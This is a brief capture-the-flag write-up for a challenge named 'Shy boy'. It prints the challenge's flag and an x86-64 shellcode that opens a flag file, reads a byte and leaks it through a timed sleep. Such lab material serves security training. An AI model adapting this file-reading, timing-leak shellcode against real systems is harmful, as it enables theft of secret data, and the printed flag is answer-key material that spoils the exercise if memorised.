Challenge: Shy boy

Description: I don't talk much but you might need some shellcode

flag: flag{n0t_50_5hy_af73r_ALl}

Solve:

Use a shellcode like this to do a time based attack
```
push rbp
mov rbp, rsp
sub rsp, 0x100
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f2e
xor [rsp], rax
mov rdi, rsp
xor edx, edx
xor esi, esi
mov rax, 2
syscall
xor eax, eax
mov rdi, 3
mov rdx, 9
inc edx
mov rsi, rsp
syscall
mov dil, byte ptr[rsp]
push 0
push rdi
mov rsi, rsp
mov rdi, rsp
mov rax, 0x23 
syscall
pop rax
pop rax
pop rax
leave
```
